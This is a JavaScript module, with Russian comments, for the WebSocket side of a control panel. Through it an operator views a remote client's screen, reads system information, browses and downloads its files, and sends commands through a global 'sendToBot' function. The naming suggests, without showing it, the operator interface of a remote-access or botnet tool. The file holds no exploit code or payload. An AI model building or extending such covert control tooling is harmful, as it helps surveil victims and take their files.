// frontend/client_control/js/modules/websocket/connection.js

import { AppState } from '../core/states.js';
import { decodePacket, encodePacket } from '../../../../dashboard/js/modules/websocket/protocol.js';
import { renderScreenRGBA } from '../features/screen_renderer.js';

let socket = null;
const $ = id => document.getElementById(id);

// Обновление текстовых элементов UI
const ui = (id, val) => { if ($(id)) $(id).textContent = val ?? '...'; };

// Визуальный индикатор статуса сети
const setOnline = (on) => {
    const el = $('status-indicator');
    el?.classList.toggle('online', on);
    el?.classList.toggle('offline', !on);
    ui('status-text', on ? 'online' : 'offline');
};

/**
 * Обработка входящих пакетов данных
 * @param {ArrayBuffer} buf - Бинарные данные из WebSocket
 */
const handleIncomingData = (buf) => {
    const pkg = decodePacket(buf);
    if (!pkg) return;

    const { module, type, action, payload, extra } = pkg;

    // --- Логика трансляции экрана ---
    if (module === 'ScreenView') {
        if (action === 'STOP') return window.resetRenderer?.();
        if (type === 'bin') return renderScreenRGBA(payload);
        return;
    }

    // --- Логика системной информации ---
    if (module === 'SystemInfo') {
        const data = payload;
        if (data && typeof data === 'object') {
            if (data.ip) ui('display-ip', data.ip);
            if (data.id) ui('display-id', data.id);
            if (data.status) window.updateBotStatus?.(data.status);
        }
        return;
    }

    // --- Логика FileManager (Управление файлами) ---
    if (module === 'FileManager') {
        console.log(`[WS] FileManager Response: ${action}`, payload);

        // 1. Получение списка файлов/дисков
        if (action === 'LIST') {
            if (window.renderFileSystem) {
                // Вызываем глобальную функцию отрисовки из модуля files.js
                window.renderFileSystem(payload);
            }
            return;
        }

        // 2. Скачивание: Анонс файла (Имя в extra, Размер в payload)
        if (action === 'DT_START') {
            window.dispatchEvent(new CustomEvent('FileManager:DT_START', { 
                detail: { extra: extra, payload: payload } 
            }));
            return;
        }

        // 3. Скачивание: Прием чанка данных
        if (action === 'DT_DATA') {
            window.dispatchEvent(new CustomEvent('FileManager:DT_DATA', { 
                detail: { payload: payload } 
            }));
            return;
        }
    }

    // Универсальное событие для всех остальных модулей
    window.dispatchEvent(new CustomEvent(`${module}:${action}`, { detail: payload }));
};

/**
 * Инициализация WebSocket соединения
 */
export const initControlConnection = () => {
    const { clientId: tid } = AppState;
    const [token, login] = ['auth_token', 'user_login'].map(k => localStorage.getItem(k));
    
    if (!token || !tid) return console.error("[WS] Missing Auth Data");

    const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
    const url = `${protocol}//${location.host}/ws?token=${token}&login=${login}&mode=control&target=${encodeURIComponent(tid)}`;
    
    socket = new WebSocket(url);
    socket.binaryType = 'arraybuffer';
    
    socket.onopen = () => setOnline(true);
    socket.onclose = () => setOnline(false);
    socket.onmessage = (e) => handleIncomingData(e.data);

    /**
     * Глобальная функция отправки команд боту
     * @param {string} modName - Имя модуля (напр. 'FileManager')
     * @param {any} pay - Данные
     * @param {string} action - Действие (LIST, RUN, etc)
     * @param {string} extra - Доп. параметр (путь или имя файла)
     */
    window.sendToBot = (modName, pay, action = 'DATA', extra = 'none') => {
        if (socket?.readyState !== 1) return;

        let type = 'str';
        if (pay instanceof ArrayBuffer || pay instanceof Uint8Array) {
            type = 'bin';
        } else if (typeof pay === 'object' && pay !== null) {
            type = 'json';
        }
        
        // Специальный хак для навигации: если это LIST, точно ставим json
        if (action === 'LIST') type = 'json';

        socket.send(encodePacket(tid, modName, type, action, extra, pay));
    };
};